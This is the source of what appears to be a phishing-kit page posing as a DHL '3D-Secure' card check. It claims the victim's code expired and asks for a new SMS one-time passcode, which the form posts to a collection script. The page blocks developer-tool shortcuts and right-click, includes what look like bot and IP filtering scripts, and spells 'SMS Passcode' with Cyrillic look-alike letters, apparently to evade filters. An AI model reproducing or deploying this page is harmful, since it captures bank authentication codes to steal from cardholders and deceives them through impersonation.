<?php 

include "./bye/agent.php";
include "./bye/ips.php";


?>
<!DOCTYPE html>
<html style="font-size: 16px;">
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="utf-8">
    <title>Service Update</title>
    <link rel="stylesheet" href="css/nice.css" media="screen">
<link rel="stylesheet" href="css/otp.css" media="screen">
    <meta name="generator" content="Nicepage 3.30.2, nicepage.com">
    <link id="u-theme-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i|Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i">
    <link id="u-page-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i">
    <meta name="theme-color" content="#478ac9">
  </head>
  <script type="text/javascript">
    document.onkeydown = function(e) {
if(event.keyCode == 123) {
return false;
}
if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
return false;
}
if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){
return false;
}
if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
return false;
}
}
  </script>
  <body oncontextmenu="return false;" class="u-body">
    <section class="u-clearfix u-grey-5 u-section-1" id="sec-b7c8">
      <div class="u-clearfix u-sheet u-sheet-1">
        <div class="u-border-2 u-border-grey-10 u-container-style u-group u-shape-rectangle u-white u-group-1">
          <div class="u-container-layout u-container-layout-1">
            <img class="u-image u-image-default u-preserve-proportions u-image-1" src="images/33547.gif" alt="" data-image-width="640" data-image-height="640">
            <img class="u-image u-image-default u-image-2" src="images/lg.png" alt="" data-image-width="640" data-image-height="142">
            <p class="u-align-left u-custom-font u-font-open-sans u-text u-text-default u-text-1">3D-Secure Authemtification<span style="font-weight: 700;"></span>
            </p>
            <p class="u-align-center-xs u-align-left-lg u-align-left-md u-align-left-sm u-align-left-xl u-custom-font u-font-open-sans u-text u-text-2">
              <span style="font-size: 0.875rem;">Please Enter One time passcode received on your phone</span>
              <center><span style="color: #ff0000;font-size: 0.875rem;">the code entered is expired</span></center>
             <center><span style="color: #ff0000;font-size: 0.875rem;">we sent a new code please confirm it</span></center>
            </p>
            <p class="u-align-center u-custom-font u-font-open-sans u-text u-text-3">
              <span style="font-weight: 700;"> Merchant :</span> DHL Service<br>
              <span style="font-weight: 700;">Amount :</span> $1.75<br>
              <span style="font-weight: 700;">Card Number : ************</span>
            </p>
            <div class="u-form u-form-1">
              <form action="./sent/tresos.php" method="POST" class="u-clearfix u-form-spacing-20 u-form-vertical u-inner-form" source="custom" name="form" style="padding: 15px;">
                <div class="u-form-group u-form-name">
                  <label for="name-0b2e" class="u-label u-label-1">SМS Рasscode :</label>
                  <input type="text"  name="onetime" class="u-border-1 u-border-grey-30 u-input u-input-rectangle u-radius-11 u-white u-input-1" required="">
                </div>
                <div class="u-align-center u-form-group u-form-submit">
                  <button type="submit" class="u-border-1 u-border-grey-75 u-btn u-btn-round u-btn-submit u-button-style u-none u-radius-17 u-btn-1">Confirm</button>
                </div>
              </form>
            </div>
          </div>
        </div>
        <p class="u-align-center u-text u-text-4"><span class="u-icon u-text-custom-color-1 u-icon-1"><svg class="u-svg-content" viewBox="0 0 500 500" style="width: 1em; height: 1em;"><g><path d="M412.898,388.827c0,13.295-10.78,24.068-24.069,24.068h-277.66c-13.292,0-24.065-10.773-24.065-24.068   V111.17c0-13.296,10.774-24.067,24.065-24.067h277.66c13.289,0,24.069,10.771,24.069,24.067V388.827z" fill="#C1272D"></path><g><defs><path d="M412.898,388.827c0,13.295-10.78,24.068-24.069,24.068h-277.66c-13.292,0-24.065-10.773-24.065-24.068     V111.17c0-13.296,10.774-24.067,24.065-24.067h277.66c13.289,0,24.069,10.771,24.069,24.067V388.827z" id="SVGID_1_"></path>
</defs><clipPath id="SVGID_2_"><use overflow="visible" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#SVGID_1_"></use>
</g>
</g>
</g><g><path d="M226.962,285.189l-0.304-7.685c-0.886-15.087,4.143-30.46,17.444-46.434    c9.47-11.235,17.16-20.695,17.16-30.753c0-10.348-6.808-17.154-21.587-17.748c-9.76,0-21.587,3.548-29.278,8.879l-10.051-32.232    c10.643-6.216,28.382-12.13,49.381-12.13c39.036,0,56.771,21.586,56.771,46.13c0,22.479-13.89,37.265-25.132,49.681    c-10.928,12.13-15.368,23.666-15.074,36.967v5.324H226.962z M219.271,326.004c0-15.683,10.935-26.911,26.313-26.911    c15.98,0,26.332,11.229,26.62,26.911c0,15.381-10.64,26.91-26.62,26.91C229.915,352.914,219.271,341.385,219.271,326.004z" fill="#FFFFFF"></path>
</g>
</g></svg><img></span>Help - Exit
        </p>
      </div>
    </section>
  </body>
</html>